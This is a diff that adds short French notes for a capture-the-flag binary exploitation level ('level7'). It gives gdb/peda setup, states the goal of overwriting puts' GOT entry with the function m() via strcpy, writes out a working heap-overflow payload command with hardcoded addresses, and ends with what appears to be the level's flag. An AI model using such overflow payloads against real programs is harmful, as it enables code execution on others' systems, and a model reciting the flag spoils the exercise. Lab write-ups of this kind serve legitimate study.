@@ -1,0 +1,19 @@
+Note: Installer peda si cela n'est pas deja fait.
+
+gdb ./level7
+
+info function:
+-----> Le binaire contient 2 fonctions (main, m).
+
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+
+
+Objectif:
+Utiliser strcpy pour changer ecraser le ladresse de puts par m().
+
+r $(python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1])") $(python -c "print('\x08\x04\x84\xf4'[::-1])")
+
+
+---> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
